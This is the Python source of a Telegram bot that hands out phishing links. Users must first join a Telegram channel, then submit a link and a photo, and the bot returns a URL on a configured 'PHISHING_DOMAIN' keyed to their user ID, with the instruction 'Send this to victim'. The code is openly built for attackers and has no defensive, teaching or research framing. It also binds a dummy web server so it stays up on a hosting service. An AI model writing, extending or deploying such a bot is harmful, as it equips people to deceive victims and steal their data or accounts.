import os
import sqlite3
import hashlib
import time
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from http.server import HTTPServer, BaseHTTPRequestHandler

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
PHISHING_DOMAIN = os.environ.get('PHISHING_DOMAIN', 'https://secure-share-server.onrender.com')
CHANNEL_USERNAME = '@nrtecno2'
PORT = int(os.environ.get('PORT', 10000))

# ========== DATABASE ==========
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'database.db')

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY, username TEXT, link TEXT, photo_id TEXT, unique_code TEXT)''')
conn.commit()

# ========== BOT ==========
bot = telebot.TeleBot(BOT_TOKEN)

# ========== FUNCTIONS ==========
def check_subscription(user_id):
    try:
        member = bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def generate_unique_link(user_id):
    raw = f"{user_id}_{time.time()}"
    return hashlib.md5(raw.encode()).hexdigest()[:10]

# ========== HANDLERS ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    is_subscribed = check_subscription(user_id)
    
    if not is_subscribed:
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("📢 Join Channel", url="https://t.me/nrtecno2"),
            InlineKeyboardButton("✅ Verify", callback_data="verify_sub")
        )
        bot.reply_to(
            message,
            "⚠️ *Access Denied!*\n\nYou must join @nrtecno2 first.",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
    else:
        bot.reply_to(message, "✅ *Verified!*\n\nSend me the **link** you want to share.", parse_mode="Markdown")
        c.execute("INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)",
                  (user_id, message.from_user.username or 'Unknown'))
        conn.commit()

@bot.callback_query_handler(func=lambda call: call.data == "verify_sub")
def verify(call):
    user_id = call.from_user.id
    is_subscribed = check_subscription(user_id)
    
    if is_subscribed:
        bot.edit_message_text(
            "✅ *Verified!*\n\nNow send me the **link** you want to share.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown"
        )
        c.execute("INSERT OR REPLACE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)

@bot.message_handler(func=lambda msg: msg.text and msg.text.startswith('http'))
def handle_link(message):
    user_id = message.from_user.id
    link = message.text
    c.execute("UPDATE users SET link = ? WHERE user_id = ?", (link, user_id))
    conn.commit()
    bot.reply_to(message, "📸 *Photo Required!*\n\nNow send a **photo** to show victim.", parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    photo_id = message.photo[-1].file_id
    
    # Generate link with user ID
    phishing_link = f"{PHISHING_DOMAIN}/{user_id}"
    
    # Store in database
    c.execute("UPDATE users SET photo_id = ?, unique_code = ? WHERE user_id = ?",
              (photo_id, str(user_id), user_id))
    conn.commit()
    
    bot.reply_to(
        message,
        f"✅ *Link Generated!*\n\n🔗 `{phishing_link}`\n\nSend this to victim.",
        parse_mode="Markdown"
    )

# ========== DUMMY HTTP SERVER (for Render port binding) ==========
class DummyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Bot is running!")

def run_http_server():
    server = HTTPServer(('0.0.0.0', PORT), DummyHandler)
    print(f"✅ Dummy HTTP server running on port {PORT}")
    server.serve_forever()

# ========== RUN ==========
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
else:
    # Start HTTP server in background
    threading.Thread(target=run_http_server, daemon=True).start()
    
    print("✅ Bot is running!")
    bot.infinity_polling()
